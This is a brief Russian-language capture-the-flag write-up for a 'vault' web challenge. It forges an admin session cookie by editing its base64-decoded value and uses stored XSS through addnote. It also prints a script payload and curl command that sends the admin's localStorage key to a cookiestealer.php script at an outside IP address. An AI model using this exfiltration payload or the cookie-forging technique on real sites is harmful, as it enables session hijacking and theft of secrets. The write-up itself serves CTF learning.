1. Переводим куку юзера из base64.  Видим, что одинаковые буквы в имени пользователя соответствуют одинаковым цифрам.

2. Создаем пользователя admina. Убираем последнюю цифру имени пользователя из куки. Переводим куку обратно в base64 и передаем ее
в http://vault.ctf2019.rocks/ . Видим запись flag, но она зашифрована.

3. Тестируем на xss. Находим, что если выполняется скприпт, есть передать незашифрованный text <script>alert("TEST");</script> в addnote.

4. Видим, что ключ находится в  localStorage->key. Делаем запрос к кукой админа:
```
src="<script type="text/javascript">document.location='http://89.163.129.121:9999/cookiestealer.php?c='.concat(window.localStorage.getItem('key'));</script>"
curl "http://vault.ctf2019.rocks/addnote.php?title=aaax&text=$src"  -H 'Cookie: session=MTYsMjEsMjgsMjQsMzE6OjoxMTM3'  -v
```
получаем ключ админа

5. добавляем ключ в localStorage->key. Получаем расшифрованный флаг в записи flag admin-a.

6. Находим дополнительный флаг с помощь dirsearch  в   http://vault.ctf2019.rocks/manage
